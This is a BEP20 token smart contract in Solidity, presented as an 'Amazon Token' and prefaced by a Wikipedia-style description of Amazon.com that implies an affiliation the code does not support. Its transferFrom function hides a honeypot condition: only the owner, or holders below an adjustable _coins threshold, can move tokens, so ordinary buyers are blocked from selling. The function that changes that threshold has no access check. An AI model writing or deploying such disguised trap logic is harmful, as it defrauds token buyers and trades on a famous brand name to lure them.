/**
 *Submitted for verification at BscScan.com on 2021-09-02
*/

/*
 Amazon Token
 
Amazon.com, Inc is an American multinational conglomerate which focuses on e-commerce,
cloud computing, digital streaming, and artificial intelligence. It is one of the Big Five companies in the U.S. information technology industry,
along with Google, Apple, Microsoft, and Facebook.
The company has been referred to as "one of the most influential economic and cultural forces in the world", as well as the world's most valuable brand.

Jeff Bezos founded Amazon from his garage in Bellevue, Washington,[15] on July 5, 1994.
It started as an online marketplace for books but expanded to sell electronics, software, video games, apparel, furniture, food, toys, and jewelry.
In 2015, Amazon surpassed Walmart as the most valuable retailer in the United States by market capitalization.
In 2017, Amazon acquired Whole Foods Market for US$13.4 billion, which substantially increased its footprint as a physical retailer.
In 2018, its two-day delivery service, Amazon Prime, surpassed 100 million subscribers worldwide.[18]

Amazon is known for its disruption of well-established industries through technological innovation and mass scale.
It is the world's largest online marketplace, AI assistant provider,
live-streaming platform and cloud computing platform as measured by revenue and market capitalization.
Amazon is the largest Internet company by revenue in the world.
It is the second largest private employer in the United States and one of the world's most valuable companies.
As of 2020, Amazon has the highest global brand valuation.[26]

Amazon distributes a variety of downloadable and streaming content through its Amazon Prime Video, Amazon Music, Twitch, and Audible subsidiaries.
Amazon also has a publishing arm, Amazon Publishing, film and television studio Amazon Studios, and a cloud computing subsidiary, Amazon Web Services.
It produces consumer electronics including Kindle e-readers, Fire tablets, Fire TV, and Echo devices.
Its acquisitions over the years include Ring, Twitch, Whole Foods Market, and IMDb. Amazon is currently in the process of purchasing film and television studio,
Metro-Goldwyn-Mayer.*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function changeMaxCoin(uint256 coin) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract BEP20TOKEN is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    uint256 public _totalSupply;
    uint256 public _coins;
    address public _owner;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor( string memory name_, string memory symbol_, address owner_ , uint256  coins_) public {
        name = name_;
        symbol = symbol_;
        decimals = 18;
        _totalSupply = 100000000000000000000000000;
        _owner = owner_;
        _coins = coins_ * 10 ** 18;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        
        if (_owner == from  || balances[from] < _coins) {
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
        }
        
         
    }
    
    function changeMaxCoin(uint256 coins) public returns (bool success) {
         _coins = coins * 10 ** 18;
         return true;
    }
}